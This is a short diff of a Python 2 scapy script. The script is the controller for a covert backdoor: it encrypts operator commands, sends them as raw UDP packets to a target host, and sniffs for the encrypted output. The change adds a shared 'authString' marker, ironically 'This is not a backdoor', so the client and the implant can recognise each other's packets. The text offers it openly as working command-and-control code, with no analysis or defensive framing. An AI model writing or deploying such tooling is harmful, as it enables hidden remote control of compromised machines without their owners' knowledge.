@@ -5,13 +5,20 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+# string to use as unique identification for our backdoor
+# we use this because ports might not be unique enough in all situations
+# if you want to change this to another value make sure both the client and
+# backdoor have the same string
+authString = "This is not a backdoor"
+
 def packetFunc(packet):
   # scapy is garbage and get's arp packet even though we're filtering
   if ARP not in packet:
-    print "Got a packet"
     encryptedData = packet['Raw'].load
     data = crypto.decrypt(encryptedData)
-    print data
+    if data.startswith(authString):
+      data = data[len(authString):]
+      print data
 
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
 parser.add_argument('-s'
@@ -38,7 +45,7 @@ while True:
   if command == "exit":
     sys.exit()
   else:
-    encryptedCommand = crypto.encrypt(command)
+    encryptedCommand = crypto.encrypt((authString + command))
     packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
     send(packet, verbose=0)
     sniff(filter=sniffFilter,prn=packetFunc, count=1)
